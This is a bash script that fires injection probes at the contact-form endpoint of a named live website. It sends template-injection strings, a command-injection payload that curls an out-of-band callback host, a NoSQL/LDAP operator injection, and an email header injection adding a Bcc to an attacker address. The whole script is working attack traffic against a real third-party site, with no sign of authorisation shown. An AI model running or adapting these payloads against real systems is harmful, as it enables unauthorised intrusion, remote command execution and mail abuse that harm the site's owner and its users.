#!/bin/bash
H="https://www.infinitycapital.bh"
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36'
O=oob0f28640adef0.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
N=oob21b337173187.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
post(){ curl -s -A "$UA" -X POST "$H/api/send" --max-time 25 "$@" | head -c 300; echo; }
echo "== T1 baseline =="
post -F 'fname=A' -F 'lname=B' -F 'areacode=973' -F 'tel=3000000' -F 'cname=A' -F 'subject=ICMARKER9' -F 'msg=hello world' -F 'check=true' -F 'targets=info@infinitycapital.bh'
echo "== T2 SSTI msg =="
post -F 'fname=A' -F 'lname=B' -F 'areacode=973' -F 'tel=3000000' -F 'cname=A' -F 'subject=ICMARKER9' -F 'msg={{7*7}}${7*7}<%= 7*7 %>#{7*7}${{7*7}}' -F 'check=true' -F 'targets=info@infinitycapital.bh'
echo "== T3 CMDi msg =="
post -F 'fname=A' -F 'lname=B' -F 'areacode=973' -F 'tel=3000000' -F 'cname=A' -F 'subject=ICMARKER9' -F "msg=x;curl http://$O/cmdi;" -F 'check=true' -F 'targets=info@infinitycapital.bh'
echo "== T4 NoSQL/LDAP =="
post -F 'fname[$ne]=1' -F 'lname=B' -F 'areacode=973' -F 'tel=3000000' -F 'cname=A' -F 'subject=ICMARKER9' -F "msg=*()|{$N}" -F 'check=true' -F 'targets=info@infinitycapital.bh'
echo "== T5 email hdr injection =="
post -F 'fname=A' -F 'lname=B' -F 'areacode=973' -F 'tel=3000000' -F 'cname=A' -F 'subject=ICMARKER9' -F 'msg=hdr' -F 'check=true' -F "targets=info@infinitycapital.bh%0aBcc:attacker@$N"
echo DONE
